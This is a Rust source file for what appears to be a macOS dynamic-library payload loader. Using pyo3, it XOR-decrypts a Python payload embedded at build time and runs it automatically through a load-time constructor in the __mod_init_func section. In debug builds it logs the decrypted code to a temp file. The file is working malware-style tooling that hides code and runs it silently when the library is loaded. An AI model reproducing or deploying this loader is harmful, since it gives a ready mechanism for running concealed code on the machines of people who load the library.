use pyo3::prelude::*;
use log::{LevelFilter};

// https://github.com/codeSamuraii/PrettyBadPrivacy/blob/master/src/main.rs
fn xor_routine<'a>(val: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted_buffer: Vec<u8> = val.iter().zip(Vec::from(key).iter().cycle()).map(|(&x, &y)| x ^ y).collect();
    return encrypted_buffer;
}

pub static CODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/enc_payload"));
pub static KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/key"));


#[used]
#[cfg_attr(target_os = "macos", link_section = "__DATA,__mod_init_func")]
pub static INITIALIZE: extern "C" fn() = init;
#[no_mangle]
pub extern "C" fn init() {
    if cfg!(debug_assertions) {
        simple_logging::log_to_file("/private/tmp/python_runner.log", LevelFilter::Debug).unwrap();
    }

    let unencrypted_payload = xor_routine(CODE, KEY);
    let python_code = std::str::from_utf8(&*unencrypted_payload).unwrap();
    if cfg!(debug_assertions) {
        log::debug!("Decrypted python payload with xor routine and key\n");
        log::debug!("Python Code: {:?}\n", python_code);
    }
    // Acquire the Global Interpreter Lock
    let gil = Python::acquire_gil();
    if cfg!(debug_assertions) {
        log::debug!("Acquired the Global Interpreter Lock");
    }

    let py = gil.python();
    if cfg!(debug_assertions) {
        log::debug!("Acquired python, calling eval");
    }

    assert!(py.version_info() >= (3, 6));
    // Execute Python code
    let res = py.run(python_code, None, None);
}

// Export test function
pub fn test_function() {}